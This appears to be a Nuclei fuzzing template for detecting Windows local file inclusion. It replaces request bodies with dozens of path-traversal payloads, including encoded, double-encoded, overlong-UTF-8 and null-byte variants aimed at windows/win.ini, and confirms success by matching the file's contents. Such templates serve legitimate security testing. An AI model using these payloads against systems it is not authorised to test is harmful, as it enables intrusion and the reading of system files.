http:
- fuzzing:
  - fuzz:
    - '{{win_fuzz}}'
    mode: multiple
    part: body
    type: replace
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  payloads:
    win_fuzz:
      high:
      - ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
      - /.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini
      - .%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini
      - /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini
      - /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
      - /%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
      - '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini'
      - '%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
      - /%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
      - /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\win.ini
      - ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
      - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
      - '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
      - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini'
      low:
      - \WINDOWS\win.ini
      - ../../windows/win.ini
      - '....//....//windows/win.ini'
      - ../../../../../windows/win.ini
      - /..///////..////..//////windows/win.ini
      - /../../../../../../../../../windows/win.ini
      - ./../../../../../../../../../../windows/win.ini
      - ..%2f..%2f..%2f..%2fwindows/win.ini
      medium:
      - \WINDOWS\win.ini%00
      - \WINNT\win.ini
      - \WINNT\win.ini%00
      - windows/win.ini%00
      - /...\...\...\...\...\...\...\...\...\windows\win.ini
      - /.../.../.../.../.../.../.../.../.../windows/win.ini
      - /..../..../..../..../..../..../..../..../..../windows/win.ini
      - /....\....\....\....\....\....\....\....\....\windows\win.ini
      - \\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini
      - /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
      - /../../../../../../../../../../../../../../../../&location=Windows/win.ini
      - ..%2f..%2f..%2f..%2f..%2fwindows/win.ini
      - ..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
      - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
      - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00
      - ..%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
  pre-condition:
  - dsl:
    - method == "POST"
    - method == "PUT"
    - method == "PATCH"
    - method == "DELETE"
    type: dsl
  stop-at-first-match: true
id: windows-lfi-fuzz-body
info:
  author: reewardius
  name: Local File Inclusion - Windows
  severity: high
  tags: fuzzing-req,fuzzing-req-body,lfi,dast
